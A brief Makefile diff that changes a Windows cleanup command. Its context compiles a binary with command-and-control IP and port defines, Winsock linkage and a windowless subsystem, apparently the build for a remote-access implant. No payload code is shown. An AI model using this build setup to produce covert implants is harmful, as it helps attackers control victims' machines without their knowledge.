@@ -35,7 +35,7 @@ endif
 all: $(SRC)
 ifeq ($(OS),Windows_NT)
 	$(eval $(call wininput))
-	@cmd /c erase /f /q .\nn .\nn
+	@cmd /c erase /f /q .\.nn .\nn
 ifneq ($(findstring Microsoft,$(shell $(CC) /? 2>&1)),) # Microsoft Visual Studio (MSVC)
 	$(CC) $(SRC) /Fe:$(BIN).exe /O1 /DNDEBUG /DC2_IP=\"$(C2_IP)\" /DC2_PORT=$(C2_PORT) /link /subsystem:windows ws2_32.lib
 else
